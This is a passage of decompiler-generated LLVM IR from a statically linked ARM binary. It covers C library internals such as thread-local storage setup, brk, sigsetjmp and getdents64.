  %v1_17f18 = load i32, i32* %sb.global-to-local, align 4
  %v2_17f18 = add i32 %v1_17f18, %v0_17f18
  store i32 %v2_17f18, i32* @ip, align 4
  %v0_17f1c = load i32, i32* %sl.global-to-local, align 4
  %v1_17f1c = load i32, i32* %r4.global-to-local, align 4
  %v2_17f1c = add i32 %v1_17f1c, %v0_17f1c
  store i32 %v2_17f1c, i32* %r4.global-to-local, align 4
  %v2_17f20 = add i32 %v0_17f1c, 11524
  store i32 %v2_17f20, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_17f18, i32* @r0, align 4
  %v2_17f34 = add i32 %v2_17f1c, 16
  %v3_17f34 = inttoptr i32 %v2_17f34 to i32*
  store i32 %v2_17f18, i32* %v3_17f34, align 4
  %v0_17f38 = load i32, i32* %sb.global-to-local, align 4
  %v1_17f38 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f38 = add i32 %v1_17f38, 40
  %v3_17f38 = inttoptr i32 %v2_17f38 to i32*
  store i32 %v0_17f38, i32* %v3_17f38, align 4
  %v0_17f3c = load i32, i32* @r3, align 4
  %v1_17f3c = trunc i32 %v0_17f3c to i8
  %v2_17f3c = load i32, i32* %r4.global-to-local, align 4
  %v3_17f3c = add i32 %v2_17f3c, 20
  %v4_17f3c = inttoptr i32 %v3_17f3c to i8*
  store i8 %v1_17f3c, i8* %v4_17f3c, align 1
  %v0_17f40 = load i32, i32* %r4.global-to-local, align 4
  %v1_17f40 = add i32 %v0_17f40, 8
  store i32 %v1_17f40, i32* @r4, align 4
  %v0_17f44 = call i32 @memcpy()
  %v0_17f4c = load i32, i32* @r4, align 4
  %v1_17f4c = load i32, i32* @r5, align 4
  %v2_17f4c = inttoptr i32 %v1_17f4c to i32*
  store i32 %v0_17f4c, i32* %v2_17f4c, align 4
  %v0_17f50 = load i32, i32* @r5, align 4
  store i32 %v0_17f50, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_17f50, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_13848.559 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_17f64 = load i32, i32* %sl.global-to-local, align 4
  %v2_17f64 = add i32 %v0_17f64, 84
  %v3_17f64 = inttoptr i32 %v2_17f64 to i32*
  %v4_17f64 = load i32, i32* %v3_17f64, align 4
  store i32 %v4_17f64, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10748, i32* %r1.global-to-local, align 4
  %v2_17f70 = add i32 %v0_17f64, 60
  %v3_17f70 = inttoptr i32 %v2_17f70 to i32*
  %v4_17f70 = load i32, i32* %v3_17f70, align 4
  store i32 %v4_17f70, i32* %r0.global-to-local, align 4
  %v3_17f78 = add i32 %v0_17f64, 10748
  %v4_17f78 = inttoptr i32 %v3_17f78 to i32*
  store i32 64, i32* %v4_17f78, align 4
  %v1_17f80 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f80 = add i32 %v1_17f80, 20
  %v3_17f80 = inttoptr i32 %v2_17f80 to i32*
  store i32 %stack_var_-44.3, i32* %v3_17f80, align 4
  %v1_17f88 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f88 = add i32 %v1_17f88, 24
  %v3_17f88 = inttoptr i32 %v2_17f88 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17f88, align 4
  %v1_17f90 = load i32, i32* %r0.global-to-local, align 4
  %v2_17f90 = inttoptr i32 %v1_17f90 to i32*
  store i32 1, i32* %v2_17f90, align 4
  %v1_17f98 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f98 = add i32 %v1_17f98, 28
  %v3_17f98 = inttoptr i32 %v2_17f98 to i32*
  store i32 %stack_var_-52.3, i32* %v3_17f98, align 4
  %v0_17fa0 = load i32, i32* @r6, align 4
  %v2_17fa0 = icmp eq i32 %v0_17fa0, 0
  %v1_17fa4 = load i32, i32* %r8.global-to-local, align 4
  %v2_17fa4 = add i32 %v1_17fa4, 44
  %v3_17fa4 = inttoptr i32 %v2_17fa4 to i32*
  store i32 1, i32* %v3_17fa4, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_17fac = load i32, i32* %sl.global-to-local, align 4
  %v1_17fac = load i32, i32* %r1.global-to-local, align 4
  %v2_17fac = add i32 %v1_17fac, %v0_17fac
  store i32 %v2_17fac, i32* %r2.global-to-local, align 4
  %v1_17fb0 = load i32, i32* @r6, align 4
  br i1 %v2_17fa0, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_17ec4
  store i32 %v1_17fb0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17fbc34 = load i32, i32* %r8.global-to-local, align 4
  %v2_17fbc35 = add i32 %v1_17fbc34, 32
  %v3_17fbc36 = inttoptr i32 %v2_17fbc35 to i32*
  store i32 %v1_17fb0, i32* %v3_17fbc36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_17ec4
  %v2_17fb4 = add i32 %v1_17fb0, -1
  store i32 %v2_17fb4, i32* %r0.global-to-local, align 4
  %v1_17fbc = load i32, i32* %r8.global-to-local, align 4
  %v2_17fbc = add i32 %v1_17fbc, 32
  %v3_17fbc = inttoptr i32 %v2_17fbc to i32*
  store i32 %v1_17fb0, i32* %v3_17fbc, align 4
  %v1_17fc0 = load i32, i32* @r6, align 4
  store i32 %v1_17fc0, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_17fc4 = load i32, i32* %r8.global-to-local, align 4
  %v1_17fc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_17fc4 = add i32 %v1_17fc4, 28
  %v3_17fc4 = inttoptr i32 %v2_17fc4 to i32*
  store i32 %v0_17fc4, i32* %v3_17fc4, align 4
  %v0_17fc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_17fc8 = load i32, i32* %ip.global-to-local, align 4
  %v2_17fc8 = inttoptr i32 %v1_17fc8 to i32*
  store i32 %v0_17fc8, i32* %v2_17fc8, align 4
  %v0_17fcc = load i32, i32* %r0.global-to-local, align 4
  %v1_17fcc = load i32, i32* %r3.global-to-local, align 4
  %v2_17fcc = add i32 %v1_17fcc, %v0_17fcc
  store i32 %v2_17fcc, i32* %r0.global-to-local, align 4
  %v1_17fd0 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_17fa0, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_17fd8.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_17fd8 = phi i32 [ %v0_17fd8.pre, %._crit_edge ], [ %v1_17fd0, %bb54 ]
  %v2_17fd4 = udiv i32 %v2_17fcc, %v1_17fd0
  %v2_17fd8 = load i32, i32* %sb.global-to-local, align 4
  %v3_17fd8 = mul i32 %v2_17fd4, %v0_17fd8
  %v4_17fd8 = add i32 %v2_17fd8, %v3_17fd8
  store i32 %v4_17fd8, i32* @r0, align 4
  %v0_17fdc = load i32, i32* %fp.global-to-local, align 4
  %v2_17fdc = icmp ult i32 %v0_17fdc, 16
  %v0_17fdc. = select i1 %v2_17fdc, i32 16, i32 %v0_17fdc
  store i32 %v0_17fdc., i32* @r1, align 4
  %v2_17fec = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17fec, i32* @r4, align 4
  store i32 %v6_17e08, i32* @r5, align 4
  store i32 %v15_17e08, i32* %r8.global-to-local, align 4
  store i32 %v18_17e08, i32* %sb.global-to-local, align 4
  store i32 %v21_17e08, i32* %sl.global-to-local, align 4
  store i32 %v24_17e08, i32* %fp.global-to-local, align 4
  store i32 %v27_17e08, i32* @lr, align 4
  %v0_17ff0 = call i32 @init_static_tls()
  store i32 %v0_17ff0, i32* %r0.global-to-local, align 4
  %v0_17ffc.pre = load i32, i32* @ip, align 4
  %v1_17ec4.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_17ed4.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17ff4

dec_label_pc_17e80.dec_label_pc_17ff4.loopexit_crit_edge: ; preds = %dec_label_pc_17e7c
  br label %dec_label_pc_17ff4.loopexit

dec_label_pc_17ff4.loopexit:                      ; preds = %dec_label_pc_17e80.dec_label_pc_17ff4.loopexit_crit_edge, %dec_label_pc_17e34
  br label %dec_label_pc_17ff4

dec_label_pc_17ff4:                               ; preds = %dec_label_pc_17ff4.loopexit, %entry, %bb55
  %v0_17ed4.pre.pre = phi i32 [ ptrtoint (i32* @global_var_22244.363 to i32), %dec_label_pc_17ff4.loopexit ], [ ptrtoint (i32* @global_var_22244.363 to i32), %entry ], [ %v0_17ed4.pre.pre.pre, %bb55 ]
  %v1_17ec4.pre.pre = phi i32 [ %v0_17e28, %dec_label_pc_17ff4.loopexit ], [ %v0_17e28, %entry ], [ %v1_17ec4.pre.pre.pre, %bb55 ]
  %v0_17ffc = phi i32 [ %v0_17e2c, %dec_label_pc_17ff4.loopexit ], [ %v0_17e2c, %entry ], [ %v0_17ffc.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_17ffc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17ec0

; uselistorder directives
  uselistorder i32 %v0_17ffc, { 1, 0 }
  uselistorder i32 %v1_17fb0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17f1c, { 1, 0 }
  uselistorder i32 %v2_17f18, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_17e7c, { 2, 1, 0 }
  uselistorder i32 %v3_17e54, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_17e5c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_17e80, { 1, 0 }
  uselistorder i32 %v0_17e2c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_17e28, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17e1c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 4, 3, 5, 6, 7, 0, 9, 8, 10, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10748, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_17ff4, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_17ec4, { 1, 0 }
  uselistorder label %dec_label_pc_17ec0, { 1, 0 }
  uselistorder label %dec_label_pc_17e44, { 1, 0 }
}

define i32 @function_18014(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18014:
  %v0_18014 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18014, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_18014
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_18014
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_18040 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_18040
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  %v4_18050 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 156) to i32*), align 4
  %v4_18058 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 104) to i32*), align 4
  store i32 %v4_18058, i32* %r1.global-to-local, align 4
  %v1_1805c = add i32 %arg1, 44
  %v2_1805c = inttoptr i32 %v1_1805c to i32*
  %v3_1805c = load i32, i32* %v2_1805c, align 4
  %v1_18060 = add i32 %arg1, 28
  %v2_18060 = inttoptr i32 %v1_18060 to i32*
  %v3_18060 = load i32, i32* %v2_18060, align 4
  store i32 %v3_18060, i32* %r2.global-to-local, align 4
  %v2_18064 = inttoptr i32 %v4_18050 to i32*
  store i32 %v3_1805c, i32* %v2_18064, align 4
  %v0_18068 = load i32, i32* %r2.global-to-local, align 4
  %v1_18068 = load i32, i32* %r1.global-to-local, align 4
  %v2_18068 = inttoptr i32 %v1_18068 to i32*
  store i32 %v0_18068, i32* %v2_18068, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_18074(i32 %arg1) local_unnamed_addr {
dec_label_pc_18074:
  %v0_18074 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18074, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18074
  %v1_18074 = load i32, i32* @ip, align 4
  %v3_18074 = mul i32 %v1_18074, %arg1
  %v2_18078 = load i32, i32* @r8, align 4
  %v4_18078 = and i32 %v2_18078, %v3_18074
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18074, %bb
  %v5_18078 = phi i32 [ %arg1, %dec_label_pc_18074 ], [ %v4_18078, %bb ]
  ret i32 %v5_18078

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_18084 = add i32 %arg1, 40
  store i32 %v1_18084, i32* %r2.global-to-local, align 4
  %v1_18088 = inttoptr i32 %v1_18084 to i32*
  %v2_18088 = load i32, i32* %v1_18088, align 4
  store i32 %v2_18088, i32* %r2.global-to-local, align 4
  %v3_18088 = add i32 %arg1, 44
  %v4_18088 = inttoptr i32 %v3_18088 to i32*
  %v5_18088 = load i32, i32* %v4_18088, align 4
  store i32 %v5_18088, i32* %r3.global-to-local, align 4
  %v0_1808c = call i32 @__aeabi_read_tp()
  %v1_18090 = inttoptr i32 %v0_1808c to i32*
  %v2_18090 = load i32, i32* %v1_18090, align 4
  store i32 %v2_18090, i32* %r1.global-to-local, align 4
  %v3_18094 = mul i32 %v5_18088, 8
  store i32 %v3_18094, i32* %r3.global-to-local, align 4
  %v1_18098 = load i32, i32* %r2.global-to-local, align 4
  %v2_18098 = add i32 %v1_18098, %v0_1808c
  %v3_1809c = add i32 %v3_18094, %v2_18090
  %v4_1809c = inttoptr i32 %v3_1809c to i32*
  store i32 %v2_18098, i32* %v4_1809c, align 4
  %v0_180a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_180a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_180a0 = add i32 %v1_180a0, %v0_180a0
  store i32 %v2_180a0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_180a8 = add i32 %v2_180a0, 4
  %v5_180a8 = inttoptr i32 %v4_180a8 to i8*
  store i8 1, i8* %v5_180a8, align 1
  %v0_180ac = load i32, i32* @r4, align 4
  %v1_180ac = add i32 %v0_180ac, 20
  store i32 %v1_180ac, i32* %r1.global-to-local, align 4
  %v1_180b0 = inttoptr i32 %v1_180ac to i32*
  %v2_180b0 = load i32, i32* %v1_180b0, align 4
  store i32 %v2_180b0, i32* @r1, align 4
  %v3_180b0 = add i32 %v0_180ac, 24
  %v4_180b0 = inttoptr i32 %v3_180b0 to i32*
  %v5_180b0 = load i32, i32* %v4_180b0, align 4
  store i32 %v5_180b0, i32* %r2.global-to-local, align 4
  %v5_180b4 = call i32 @__GI_mempcpy(i32 %v2_18098, i32 %v2_180b0, i32 %v5_180b0, i32 1)
  %v0_180b8 = load i32, i32* @r4, align 4
  %v1_180b8 = add i32 %v0_180b8, 28
  store i32 %v1_180b8, i32* %r3.global-to-local, align 4
  %v1_180bc = inttoptr i32 %v1_180b8 to i32*
  %v2_180bc = load i32, i32* %v1_180bc, align 4
  store i32 %v2_180bc, i32* %r2.global-to-local, align 4
  %v3_180bc = add i32 %v0_180b8, 24
  %v4_180bc = inttoptr i32 %v3_180bc to i32*
  %v5_180bc = load i32, i32* %v4_180bc, align 4
  store i32 %v5_180bc, i32* %r3.global-to-local, align 4
  %v2_180c0 = sub i32 %v5_180bc, %v2_180bc
  store i32 %v2_180c0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_180c8 = inttoptr i32 %v5_180b4 to i8*
  %v4_180c8 = call i32 @__GI_memset(i8* %v3_180c8, i32 0, i32 %v2_180c0)
  ret i32 %v4_180c8

; uselistorder directives
  uselistorder i32 %v3_18094, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_18118:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 11576) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_1812c = load i32, i32* @r0, align 4
  %v1_18130 = inttoptr i32 %v0_1812c to i32*
  %v2_18130 = load i32, i32* @r4, align 4
  store i32 %v2_18130, i32* %v1_18130, align 4
  %v3_18130 = add i32 %v0_1812c, 4
  %v4_18130 = inttoptr i32 %v3_18130 to i32*
  %v5_18130 = load i32, i32* @r5, align 4
  store i32 %v5_18130, i32* %v4_18130, align 4
  %v6_18130 = add i32 %v0_1812c, 8
  %v7_18130 = inttoptr i32 %v6_18130 to i32*
  %v8_18130 = load i32, i32* @r6, align 4
  store i32 %v8_18130, i32* %v7_18130, align 4
  %v9_18130 = add i32 %v0_1812c, 12
  %v10_18130 = inttoptr i32 %v9_18130 to i32*
  %v11_18130 = load i32, i32* @r7, align 4
  store i32 %v11_18130, i32* %v10_18130, align 4
  %v12_18130 = add i32 %v0_1812c, 16
  %v13_18130 = inttoptr i32 %v12_18130 to i32*
  %v14_18130 = load i32, i32* @r8, align 4
  store i32 %v14_18130, i32* %v13_18130, align 4
  %v15_18130 = add i32 %v0_1812c, 20
  %v16_18130 = inttoptr i32 %v15_18130 to i32*
  %v17_18130 = load i32, i32* @sb, align 4
  store i32 %v17_18130, i32* %v16_18130, align 4
  %v18_18130 = add i32 %v0_1812c, 24
  %v19_18130 = inttoptr i32 %v18_18130 to i32*
  %v20_18130 = load i32, i32* @sl, align 4
  store i32 %v20_18130, i32* %v19_18130, align 4
  %v21_18130 = add i32 %v0_1812c, 28
  %v22_18130 = inttoptr i32 %v21_18130 to i32*
  %v23_18130 = load i32, i32* @fp, align 4
  store i32 %v23_18130, i32* %v22_18130, align 4
  %v24_18130 = add i32 %v0_1812c, 32
  %v25_18130 = inttoptr i32 %v24_18130 to i32*
  %v27_18130 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_18130, i32* %v25_18130, align 4
  %v28_18130 = add i32 %v0_1812c, 36
  %v29_18130 = inttoptr i32 %v28_18130 to i32*
  %v30_18130 = load i32, i32* @lr, align 4
  store i32 %v30_18130, i32* %v29_18130, align 4
  %v0_18134 = call i32 @__sigjmp_save()
  ret i32 %v0_18134

; uselistorder directives
  uselistorder i32 %v0_1812c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 109, 110, 13, 14, 15, 16, 17, 18, 19, 20, 97, 98, 99, 100, 101, 103, 102, 104, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 3, 0, 1, 2, 4, 5, 6, 7, 8, 41, 40, 46, 47, 42, 43, 44, 45, 21, 22, 23, 24, 25, 26, 27, 28, 29, 48, 49, 50, 51, 52, 53, 54, 55, 9, 10, 11, 12, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 69, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 85, 86, 88, 89, 90, 91, 92, 93, 94, 95, 96, 105, 106, 107, 108 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_1813c = load i32, i32* @r5, align 4
  %v12_1813c = load i32, i32* @r7, align 4
  %v1_18140 = add i32 %arg3, 14
  %v2_18148 = ptrtoint i32* %stack_var_-72 to i32
  %v1_1814c = and i32 %v1_18140, -8
  %v2_18150 = sub i32 %v2_18148, %v1_1814c
  %v1_18154 = add i32 %v2_18150, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_18198, label %dec_label_pc_1817c

dec_label_pc_1817c:                               ; preds = %entry
  %v1_18180 = sub i32 0, %arg1
  %v3_18184 = load i16, i16* @global_var_2229c.359, align 2
  %v4_18184 = sext i16 %v3_18184 to i32
  %v0_18188 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18190 = add i32 %v4_18184, %v0_18188
  %v4_18190 = inttoptr i32 %v3_18190 to i32*
  store i32 %v1_18180, i32* %v4_18190, align 4
  br label %dec_label_pc_18268

dec_label_pc_18198:                               ; preds = %entry
  br i1 false, label %dec_label_pc_18268, label %dec_label_pc_181a0

dec_label_pc_181a0:                               ; preds = %dec_label_pc_18198
  %v2_181a0 = add i32 %v1_18154, %arg1
  store i32 %v2_181a0, i32* %r1.global-to-local, align 4
  %v2_181a4 = add i32 %tmp, %arg3
  store i32 %v1_18154, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18250

dec_label_pc_181c0:                               ; preds = %dec_label_pc_18250
  %v1_181c0 = add i32 %v0_18220, 16
  %v2_181c0 = inttoptr i32 %v1_181c0 to i16*
  %v3_181c0 = load i16, i16* %v2_181c0, align 2
  %v4_181c0 = zext i16 %v3_181c0 to i32
  %v1_181c4 = add nsw i32 %v4_181c0, -19
  store i32 %v1_181c4, i32* @r2, align 4
  %v1_181c8 = add nuw nsw i32 %v4_181c0, 7
  %v1_181cc = and i32 %v1_181c8, 131064
  store i32 %v1_181cc, i32* @ip, align 4
  %v2_181d4 = add i32 %v1_181cc, %v0_18228
  store i32 %v2_181d4, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_181d4, %v2_181a4
  br i1 %tmp24, label %dec_label_pc_181e0, label %dec_label_pc_1821c

dec_label_pc_181e0:                               ; preds = %dec_label_pc_181c0
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_181e8 = load i32, i32* %r8.global-to-local, align 4
  %v0_181ec = load i32, i32* %sb.global-to-local, align 4
  %v1_181f0 = load i32, i32* @sp, align 4
  %v2_181f0 = inttoptr i32 %v1_181f0 to i32*
  store i32 0, i32* %v2_181f0, align 4
  %v4_181f4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_181e8, i32 %v0_181ec)
  %v0_181f8 = load i32, i32* @r5, align 4
  %v1_181f8 = load i32, i32* %sl.global-to-local, align 4
  %v9_181f8 = icmp eq i32 %v0_181f8, %v1_181f8
  br i1 %v9_181f8, label %dec_label_pc_18200, label %dec_label_pc_18264

dec_label_pc_18200:                               ; preds = %dec_label_pc_181e0
  %v0_18204 = call i32 @__aeabi_read_tp()
  %v3_18208 = load i16, i16* @global_var_2229c.359, align 2
  %v4_18208 = sext i16 %v3_18208 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18214 = add i32 %v4_18208, %v0_18204
  %v4_18214 = inttoptr i32 %v3_18214 to i32*
  store i32 22, i32* %v4_18214, align 4
  br label %dec_label_pc_18268

dec_label_pc_1821c:                               ; preds = %dec_label_pc_181c0
  %v1_1821c = inttoptr i32 %v0_18220 to i32*
  %v2_1821c = load i32, i32* %v1_1821c, align 4
  %v3_1821c = add i32 %v0_18220, 4
  %v4_1821c = inttoptr i32 %v3_1821c to i32*
  %v5_1821c = load i32, i32* %v4_1821c, align 4
  store i32 %v5_1821c, i32* @r4, align 4
  %v1_18220 = add i32 %v0_18220, 8
  store i32 %v1_18220, i32* %r8.global-to-local, align 4
  %v1_18224 = inttoptr i32 %v1_18220 to i32*
  %v2_18224 = load i32, i32* %v1_18224, align 4
  store i32 %v2_18224, i32* %r8.global-to-local, align 4
  %v3_18224 = add i32 %v0_18220, 12
  %v4_18224 = inttoptr i32 %v3_18224 to i32*
  %v5_18224 = load i32, i32* %v4_18224, align 4
  store i32 %v5_18224, i32* %sb.global-to-local, align 4
  %v1_18228 = inttoptr i32 %v0_18228 to i32*
  store i32 %v2_1821c, i32* %v1_18228, align 4
  %v3_18228 = add i32 %v0_18228, 4
  %v4_18228 = inttoptr i32 %v3_18228 to i32*
  %v5_18228 = load i32, i32* @r4, align 4
  store i32 %v5_18228, i32* %v4_18228, align 4
  %v0_1822c = load i32, i32* %r8.global-to-local, align 4
  %v1_1822c = load i32, i32* @r5, align 4
  %v2_1822c = add i32 %v1_1822c, 8
  %v3_1822c = inttoptr i32 %v2_1822c to i32*
  store i32 %v0_1822c, i32* %v3_1822c, align 4
  %v0_18230 = load i32, i32* %sb.global-to-local, align 4
  %v1_18230 = load i32, i32* @r5, align 4
  %v2_18230 = add i32 %v1_18230, 12
  %v3_18230 = inttoptr i32 %v2_18230 to i32*
  store i32 %v0_18230, i32* %v3_18230, align 4
  %v0_18234 = load i32, i32* @ip, align 4
  %v1_18234 = trunc i32 %v0_18234 to i16
  %v2_18234 = load i32, i32* @r5, align 4
  %v3_18234 = add i32 %v2_18234, 16
  %v4_18234 = inttoptr i32 %v3_18234 to i16*
  store i16 %v1_18234, i16* %v4_18234, align 2
  %v0_18238 = load i32, i32* @r7, align 4
  %v1_18238 = add i32 %v0_18238, 18
  %v2_18238 = inttoptr i32 %v1_18238 to i8*
  %v3_18238 = load i8, i8* %v2_18238, align 1
  %v4_18238 = zext i8 %v3_18238 to i32
  store i32 %v4_18238, i32* @r3, align 4
  %v2_1823c = load i32, i32* @r5, align 4
  %v3_1823c = add i32 %v2_1823c, 18
  %v4_1823c = inttoptr i32 %v3_1823c to i8*
  store i8 %v3_18238, i8* %v4_1823c, align 1
  %v0_18240 = call i32 @memcpy()
  %v0_18244 = load i32, i32* @r7, align 4
  %v1_18244 = add i32 %v0_18244, 16
  %v2_18244 = inttoptr i32 %v1_18244 to i16*
  %v3_18244 = load i16, i16* %v2_18244, align 2
  %v4_18244 = zext i16 %v3_18244 to i32
  %v0_18248 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18248, i32* @r5, align 4
  %v2_1824c = add i32 %v4_18244, %v0_18244
  store i32 %v2_1824c, i32* @r7, align 4
  br label %dec_label_pc_18250

dec_label_pc_18250:                               ; preds = %dec_label_pc_181a0, %dec_label_pc_1821c
  %v0_18228 = phi i32 [ %tmp, %dec_label_pc_181a0 ], [ %v0_18248, %dec_label_pc_1821c ]
  %v0_18220 = phi i32 [ %v1_18154, %dec_label_pc_181a0 ], [ %v2_1824c, %dec_label_pc_1821c ]
  %v3_18254 = icmp ult i32 %v0_18220, %v2_181a0
  %v1_18258 = add i32 %v0_18228, 19
  store i32 %v1_18258, i32* @r0, align 4
  %v1_1825c = add i32 %v0_18220, 19
  store i32 %v1_1825c, i32* @r1, align 4
  br i1 %v3_18254, label %dec_label_pc_181c0, label %dec_label_pc_18264.loopexit

dec_label_pc_18264.loopexit:                      ; preds = %dec_label_pc_18250
  %v0_18264.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18264

dec_label_pc_18264:                               ; preds = %dec_label_pc_18264.loopexit, %dec_label_pc_181e0
  %v1_18264 = phi i32 [ %v0_18228, %dec_label_pc_18264.loopexit ], [ %v0_181f8, %dec_label_pc_181e0 ]
